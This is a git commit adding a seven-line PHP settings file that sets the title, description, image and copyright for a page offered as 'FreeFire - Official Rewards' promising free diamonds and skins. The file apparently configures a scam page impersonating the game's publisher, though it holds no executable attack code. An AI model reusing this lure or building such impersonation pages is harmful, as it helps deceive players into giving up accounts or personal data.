e345e04a5c08c185cb7b551ca26a02e4d3a3d5b1
venomx6942-wq <venomx6942@gmail.com>
2026-05-17 07:57:00 +0530

    Create setting.php

---
+++ system/setting.php
@@ -0,0 +1,7 @@
+<?php
+$title = "FreeFire - Official Rewards";
+$description = "Get free diamonds and skins";
+$image = "https://i.ibb.co/8dmqCXS/20231022-131808.jpg";
+$theme = "#000000";
+$copyright = "Garena, Inc.";
+?>
